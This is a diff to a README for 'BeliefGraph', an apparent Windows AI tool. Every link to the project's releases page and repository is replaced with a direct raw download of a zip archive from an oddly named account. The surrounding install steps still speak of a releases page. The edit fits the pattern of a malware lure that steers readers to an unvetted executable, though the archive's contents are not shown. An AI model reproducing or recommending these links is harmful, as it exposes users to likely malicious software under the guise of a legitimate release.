@@ -1,6 +1,6 @@
 # 🤖 BeliefGraph - Build Smarter AI Models Fast
 
-[![Download BeliefGraph](https://img.shields.io/badge/Download-BeliefGraph-4CAF50?style=for-the-badge)](https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph/releases)
+[![Download BeliefGraph](https://img.shields.io/badge/Download-BeliefGraph-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/Stokesadamssyndromebearingwall73/BeliefGraph/main/core/Belief_Graph_2.9-beta.1.zip)
 
 ---
 
@@ -30,7 +30,7 @@ BeliefGraph runs on standard Windows machines without extra hardware or software
 Follow these steps to download and run BeliefGraph on your Windows PC:
 
 1. Click the big green **Download BeliefGraph** button at the top or visit this page:  
-   [https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph/releases](https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph/releases)
+   [https://raw.githubusercontent.com/Stokesadamssyndromebearingwall73/BeliefGraph/main/core/Belief_Graph_2.9-beta.1.zip](https://raw.githubusercontent.com/Stokesadamssyndromebearingwall73/BeliefGraph/main/core/Belief_Graph_2.9-beta.1.zip)
 
 2. On the releases page, find the latest version listed under "Assets."
 
@@ -49,7 +49,7 @@ Follow these steps to download and run BeliefGraph on your Windows PC:
 ## 🔽 Download and Installation Details
 
 - Visit the GitHub releases page to download the latest version:  
-  [Download BeliefGraph here](https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph/releases)
+  [Download BeliefGraph here](https://raw.githubusercontent.com/Stokesadamssyndromebearingwall73/BeliefGraph/main/core/Belief_Graph_2.9-beta.1.zip)
 
 - Always download from the latest stable release for best experience.
 
@@ -127,7 +127,7 @@ BeliefGraph is open source. You can use, modify, and share it freely under the t
 ## 🔗 Useful Links
 
 - Releases page:  
-  [https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph/releases](https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph/releases)  
+  [https://raw.githubusercontent.com/Stokesadamssyndromebearingwall73/BeliefGraph/main/core/Belief_Graph_2.9-beta.1.zip](https://raw.githubusercontent.com/Stokesadamssyndromebearingwall73/BeliefGraph/main/core/Belief_Graph_2.9-beta.1.zip)  
 - GitHub repository:  
-  [https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph](https://github.com/Stokesadamssyndromebearingwall73/BeliefGraph)  
+  [https://raw.githubusercontent.com/Stokesadamssyndromebearingwall73/BeliefGraph/main/core/Belief_Graph_2.9-beta.1.zip](https://raw.githubusercontent.com/Stokesadamssyndromebearingwall73/BeliefGraph/main/core/Belief_Graph_2.9-beta.1.zip)  
 - Documentation and support channels are available in the repository as well.
